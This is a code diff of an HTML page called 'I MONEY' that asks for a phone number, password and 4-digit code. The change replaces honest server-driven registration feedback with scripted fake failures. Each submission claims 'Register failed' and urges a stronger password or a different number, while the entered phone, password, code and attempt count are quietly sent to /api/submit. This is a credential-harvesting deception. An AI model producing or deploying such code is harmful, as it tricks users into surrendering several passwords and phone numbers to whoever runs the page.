@@ -3,156 +3,186 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>I MONEY - User Registration</title>
+  <title>I MONEY</title>
   <style>
     * { box-sizing: border-box; font-family: Arial, sans-serif; }
     body {
       margin: 0;
       min-height: 100vh;
+      background-color: #0b1324;
+      color: #ffffff;
       display: flex;
-      align-items: center;
       justify-content: center;
-      background: #0f172a;
-      color: #f8fafc;
-      padding: 16px;
+      align-items: center;
+      padding: 20px;
     }
     .card {
+      background-color: #162033;
+      border: 1px solid #26334d;
+      border-radius: 14px;
+      padding: 28px 24px;
       width: 100%;
-      max-width: 400px;
-      background: #1e293b;
-      border: 1px solid #334155;
-      border-radius: 12px;
-      padding: 24px;
+      max-width: 380px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
     }
-    h1 { margin: 0 0 6px; font-size: 22px; color: #38bdf8; }
-    p.sub { margin: 0 0 20px; font-size: 13px; color: #94a3b8; }
-    label { display: block; margin: 12px 0 6px; font-size: 13px; color: #cbd5e1; }
+    h1 {
+      margin: 0 0 8px 0;
+      color: #2196f3;
+      font-size: 24px;
+      letter-spacing: 0.5px;
+    }
+    p.sub {
+      margin: 0 0 22px 0;
+      color: #a0aec0;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: #e2e8f0;
+    }
     input {
       width: 100%;
-      padding: 11px 12px;
+      padding: 12px;
+      margin-bottom: 16px;
       border-radius: 8px;
-      border: 1px solid #475569;
-      background: #0f172a;
-      color: #fff;
+      border: 1px solid #2d3b55;
+      background-color: #1b263b;
+      color: #ffffff;
       font-size: 15px;
+      outline: none;
     }
+    input:focus { border-color: #2196f3; }
     button {
       width: 100%;
-      margin-top: 18px;
-      padding: 12px;
+      padding: 13px;
+      background-color: #1db954;
+      color: #000000;
+      font-weight: bold;
+      font-size: 16px;
       border: none;
       border-radius: 8px;
-      background: #22c55e;
-      color: #052e16;
-      font-weight: bold;
-      font-size: 15px;
       cursor: pointer;
+      margin-top: 4px;
     }
-    button:disabled { background: #475569; color: #cbd5e1; cursor: not-allowed; }
-    .msg {
-      margin-top: 14px;
-      padding: 10px 12px;
-      border-radius: 8px;
-      font-size: 13px;
-      display: none;
+    button:disabled {
+      background-color: #3a5a40;
+      color: #cbd5e0;
+      cursor: not-allowed;
     }
-    .msg.ok { display: block; background: #14532d; color: #bbf7d0; }
-    .msg.err { display: block; background: #7f1d1d; color: #fecaca; }
-    .footer-link {
+    #timerBox {
       margin-top: 16px;
       text-align: center;
-      font-size: 12px;
+      font-size: 15px;
+      color: #38bdf8;
+      display: none;
     }
-    .footer-link a { color: #38bdf8; text-decoration: none; }
+    #statusMsg {
+      margin-top: 12px;
+      text-align: center;
+      font-size: 14px;
+      color: #f87171;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
+
   <div class="card">
     <h1>I MONEY</h1>
     <p class="sub">Enter your 10-digit phone number, password, and 4-digit code.</p>
 
-    <form id="regForm">
+    <form id="userForm">
       <label for="phone">Phone Number (10 digits)</label>
-      <input id="phone" name="phone" type="tel" maxlength="10" placeholder="9876543210" required />
+      <input type="tel" id="phone" placeholder="9876543210" pattern="\d{10}" maxlength="10" required />
 
       <label for="password">Password (min 6 characters)</label>
-      <input id="password" name="password" type="password" minlength="6" placeholder="••••••••" required />
+      <input type="password" id="password" placeholder="........" minlength="6" required />
 
       <label for="code">4-Digit Code</label>
-      <input id="code" name="code" type="text" inputmode="numeric" maxlength="4" placeholder="1234" required />
+      <input type="text" id="code" placeholder="1234" pattern="\d{4}" maxlength="4" required />
 
-      <button id="submitBtn" type="submit">Submit</button>
+      <button type="submit" id="submitBtn">Register</button>
     </form>
 
-    <div id="msgBox" class="msg"></div>
-
-    <div class="footer-link">
-      <a href="/admin.html">Admin Login</a>
-    </div>
+    <div id="timerBox">Please wait: <span id="countdown">59</span>s</div>
+    <div id="statusMsg"></div>
   </div>
 
   <script>
-    const form = document.getElementById("regForm");
-    const submitBtn = document.getElementById("submitBtn");
-    const msgBox = document.getElementById("msgBox");
+    const form = document.getElementById('userForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerBox = document.getElementById('timerBox');
+    const countdownEl = document.getElementById('countdown');
+    const statusMsg = document.getElementById('statusMsg');
+
     let timerInterval = null;
+    let registerCount = parseInt(localStorage.getItem('imoney_register_count') || '0', 10);
 
-    function showMsg(text, isError) {
-      msgBox.textContent = text;
-      msgBox.className = "msg " + (isError ? "err" : "ok");
-    }
-
-    function startCooldown(seconds) {
-      clearInterval(timerInterval);
-      let left = Number(seconds) || 0;
-      if (left <= 0) {
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Submit";
-        return;
-      }
+    function startCountdown(seconds) {
+      let timeLeft = seconds;
+      countdownEl.textContent = timeLeft;
+      timerBox.style.display = 'block';
       submitBtn.disabled = true;
-      submitBtn.textContent = `Wait ${left}s...`;
 
+      clearInterval(timerInterval);
       timerInterval = setInterval(() => {
-        left -= 1;
-        if (left <= 0) {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
           clearInterval(timerInterval);
+          timerBox.style.display = 'none';
           submitBtn.disabled = false;
-          submitBtn.textContent = "Submit";
-        } else {
-          submitBtn.textContent = `Wait ${left}s...`;
         }
       }, 1000);
     }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const phone = document.getElementById("phone").value.trim();
-      const password = document.getElementById("password").value;
-      const code = document.getElementById("code").value.trim();
+    function getAttemptConfig(attemptNumber) {
+      if (attemptNumber === 1) {
+        return {
+          seconds: 59,
+          message: "Register failed try again"
+        };
+      }
+      if (attemptNumber === 2) {
+        return {
+          seconds: 90,
+          message: "Register failed use strong password"
+        };
+      }
+      return {
+        seconds: 90,
+        message: "Register failed try with different number"
+      };
+    }
 
-      submitBtn.disabled = true;
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      registerCount += 1;
+      localStorage.setItem('imoney_register_count', String(registerCount));
+
+      const config = getAttemptConfig(registerCount);
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const code = document.getElementById('code').value.trim();
+
+      statusMsg.style.color = '#f87171';
+      statusMsg.textContent = config.message;
+
+      startCountdown(config.seconds);
+
       try {
-        const res = await fetch("/api/user/register", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ phone, password, code })
+        await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone, password, code, attempt: registerCount })
         });
-        const data = await res.json();
-        if (!res.ok) {
-          showMsg(data.error || "Submission failed.", true);
-          if (data.cooldownSeconds) {
-            startCooldown(data.cooldownSeconds);
-          } else {
-            submitBtn.disabled = false;
-          }
-          return;
-        }
-        showMsg(`${data.message} (Attempt ${data.attempt})`, false);
-        startCooldown(data.cooldownSeconds || 59);
       } catch (err) {
-        showMsg("Network error. Please try again.", true);
-        submitBtn.disabled = false;
+        console.error('Error sending data to server:', err);
       }
     });
   </script>
